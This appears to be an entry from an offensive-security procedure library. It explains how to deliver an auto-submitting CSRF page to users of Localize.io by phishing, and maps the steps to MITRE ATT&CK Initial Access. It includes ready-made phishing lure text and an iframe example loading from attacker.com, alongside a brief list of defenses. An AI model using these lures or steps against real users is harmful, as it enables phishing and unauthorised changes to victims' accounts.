---
id: 123e4567-e89b-12d3-a456-426614174003
name: Deliver-Malicious-Page-to-Victim
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:03.803Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Drive-by Compromise]]'
sub_techniques: []
tags:
  - phishing
  - csrf
commands: []
platforms:
  - Web
tools: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---

# Deliver-Malicious-Page-to-Victim

## Summary

Distribute the auto-submitting CSRF HTML page to the victim via phishing or hosting, causing their browser to execute the forged request using active session cookies.

## Description

Delivery is key to CSRF success; the victim must visit the page while authenticated to Localize.io. This procedure covers hosting the page or embedding it in communications, tricking the victim into loading it. The attack exploits browser behavior where cross-site POSTs carry cookies if not blocked by SameSite attributes.

## Requirements

1. Hosted location for HTML (e.g., free web host or email body)
2. Social engineering to lure victim (e.g., fake link in email)
3. Victim's email or contact info

## Defense

Defensive measures and detection strategies:

- Educate users on phishing links
- Implement referrer checks or origin validation on endpoints
- Use email filters to block suspicious HTML attachments

## Objectives

1. Induce victim to load the malicious page
2. Trigger CSRF execution via session hijacking
3. Confirm settings modification

## Instructions

### Step 1: Host or Embed the Page

**Context**: Make the HTML accessible to the victim.

Upload csrf.html to a web server (e.g., GitHub Pages) or embed as inline HTML in an email.

> Example phishing email: "Click here to update your profile: <iframe src='http://attacker.com/csrf.html'></iframe>" (note: iframes may be blocked; prefer direct link).

### Step 2: Send to Victim and Monitor

**Context**: Deliver and observe effects.

Send link via email: "Urgent: Verify your Localize.io settings [link]".

> Expected: Victim clicks, page loads, request submits. Check victim's account for changes.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Phishing]]
- [[csrf]]
